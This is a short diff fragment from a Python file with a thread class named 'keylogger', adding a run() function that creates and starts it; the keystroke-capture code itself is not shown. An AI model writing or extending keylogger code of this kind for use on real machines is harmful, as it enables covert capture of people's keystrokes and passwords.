@@ -116,3 +116,7 @@ class keylogger(threading.Thread):
         sys.setrecursionlimit(4000)  
         self.Close(True)
         self.Destroy()
+        
+def run():
+    k=keylogger();
+    k.run()
